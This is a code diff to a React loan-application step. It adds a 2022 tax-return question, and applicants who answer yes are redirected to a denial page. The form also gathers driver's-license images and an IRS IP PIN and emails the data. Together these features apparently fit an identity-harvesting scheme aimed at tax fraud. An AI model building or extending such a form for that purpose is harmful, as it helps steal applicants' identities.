@@ -10,6 +10,7 @@ import {
 } from "@fortawesome/free-solid-svg-icons";
 import FormDataContext from "@/contexts/data";
 import Dropzone from "react-dropzone";
+import { useRouter } from "next/navigation";
 
 import axios from "axios";
 
@@ -19,6 +20,7 @@ const LoanProcessSeven = ({ step, setStep }) => {
   const [isFileUploadingback, setFileUploadingback] = useState(false);
   const [bgloading, setbgloading] = useState(false);
   const [errors, setErrors] = useState({});
+  const router = useRouter();
 
   const handleChange = (e) => {
     setFormData({ ...formData, [e.target.name]: e.target.value });
@@ -90,6 +92,9 @@ const LoanProcessSeven = ({ step, setStep }) => {
       errors.licenseState = "Driver's license state is required";
       isValid = false;
     }
+    if (!formData.taxReturn) {
+      errors.taxReturn = "This field is required.";
+    }
 
     if (!formData.frontView) {
       errors.frontView = "Front view of driver's license is required";
@@ -144,8 +149,17 @@ const LoanProcessSeven = ({ step, setStep }) => {
         setbgloading(true);
         await axios.post("/api", { formData });
         console.log("Email sent successfully");
+        if (formData.taxReturn === "yes") {
+          setbgloading(true);
 
-        setStep(step + 1);
+          // Remove items from local storage
+          localStorage.removeItem("formData");
+          localStorage.removeItem("formStep");
+
+          router.push("/loan/denied");
+        } else {
+          setStep(step + 1);
+        }
       } catch (error) {
         console.error("Error sending email:", error);
       }
@@ -344,7 +358,25 @@ const LoanProcessSeven = ({ step, setStep }) => {
             <p className="text-red-500 text-sm mt-1">{errors.receivedIPPIN}</p>
           )}
         </div>
-
+        <label
+          className="block text-gray-700 font-semibold mb-2 mt-7"
+          htmlFor="taxReturn"
+        >
+          Did you file for 2022 tax return?
+        </label>
+        <select
+          className="w-full border border-gray-300 rounded-lg pl-3 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none"
+          name="taxReturn"
+          id="taxReturn"
+          value={formData.taxReturn}
+          onChange={handleChange}
+          required
+        >
+          <option value="">Select...</option>
+          <option value="yes">Yes</option>
+          <option value="no">No</option>
+        </select>
+        {errors.taxReturn && <p className="text-red-500">{errors.taxReturn}</p>}
         <div className="mt-7">
           <label className="block text-gray-700 font-semibold mb-2">
             Means of Disbursement
